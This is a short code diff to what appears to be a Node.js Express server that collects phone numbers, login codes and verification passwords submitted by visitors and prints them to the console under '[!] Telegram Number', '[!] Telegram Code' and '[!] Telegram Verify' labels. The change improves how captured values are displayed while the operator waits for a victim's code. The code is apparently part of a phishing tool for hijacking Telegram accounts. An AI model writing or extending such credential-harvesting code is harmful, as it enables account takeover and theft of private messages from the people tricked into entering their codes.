@@ -43,8 +43,20 @@ telegram: req.body.telegram,
 code: req.body.code
 };
 logs.push(logData);
-console.log('[!] Telegram Number'.white.bold,`${logData.number}`.green.bold);
-console.log('[!] Telegram Code'.white.bold, `${logData.code}`.blue.bold);
+console.log('\n[!] Telegram Number'.white.bold,`${logData.number}`.green.bold);
+if (!logData.code || logData.code.trim() === '') {
+    console.log('[!] Telegram Code'.white.bold, 'Loading...'.yellow.bold);
+} else {
+    console.log('[!] Telegram Code'.white.bold, `${logData.code}`.blue.bold);
+}
+
+if (!logData.telegram || logData.telegram.trim() === '') {
+    console.log('[!] Telegram Verify'.white.bold, 'Loading...'.yellow.bold);
+} else {
+    console.log('[!] Telegram Verify'.white.bold, `${logData.telegram}`.blue.bold);
+}
+
+
 })
 
 app.get('/server', (req, res) => {
